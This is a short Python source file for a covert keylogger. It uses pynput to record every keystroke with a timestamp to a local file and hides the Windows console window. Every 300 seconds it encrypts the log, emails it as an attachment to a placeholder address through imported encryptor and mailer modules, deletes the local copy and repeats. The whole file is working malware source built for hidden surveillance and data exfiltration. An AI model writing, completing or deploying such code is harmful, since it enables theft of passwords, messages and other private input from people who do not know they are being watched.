from pynput import keyboard
from datetime import datetime
import threading
import os
import time
import encryptor
import mailer

LOG_FILE = "log.txt"
INTERVAL = 300  # seconds

def write_log(key):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} - {key}\n")

def on_press(key):
    try:
        write_log(key.char)
    except AttributeError:
        write_log(str(key))

def report():
    encryptor.encrypt_log(LOG_FILE)
    mailer.send_email(
        subject="Keylogger Log",
        body="See attached encrypted log.",
        to="<your_email@gmail.com>",
        attachment_path=LOG_FILE
    )
    os.remove(LOG_FILE)
    threading.Timer(INTERVAL, report).start()

def hide_window():
    # Windows-only: hides the console
    import ctypes
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd:
        ctypes.windll.user32.ShowWindow(whnd, 0)

if __name__ == "__main__":
    hide_window()
    report()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
